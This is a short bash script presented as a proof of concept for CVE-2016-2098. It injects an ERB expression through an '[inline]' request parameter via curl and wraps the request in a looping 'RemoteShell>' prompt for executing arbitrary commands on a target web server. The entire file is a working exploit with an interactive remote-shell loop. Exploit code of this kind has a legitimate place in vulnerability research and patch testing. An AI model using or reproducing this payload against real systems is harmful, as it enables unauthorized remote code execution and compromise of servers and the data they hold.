#!/bin/bash

echo ' ## execute arbitary code: CVE-2016-2098 POC'
 
if [ -z "$3" ]
then
    echo '- USE: /bin/bash' $0 '<host address> <URI> <command>'
    echo '- Example: /bin/bash' $0 '"http://target.com" "pages?id" "pwd"'
    exit -1
fi
 
addr=$1
uri=$2
command=$3

while [ "$command" != 'exit' ]
do
    echo 'Vulnerable page set to:' $addr
    echo 'Vulnerable parameter set to:' $uri
    echo 'Command to be executed:' $command
    echo '- Executing '$command 'on '$addr
    command=`echo "$command"|sed 's/ /%20/g'`
    curl -i $addr'/'$uri'[inline]=%3C%25=%20%25x('$command')%20%25%3E' -g
    echo
    read -p 'RemoteShell> ' command
done
echo '## Exiting'
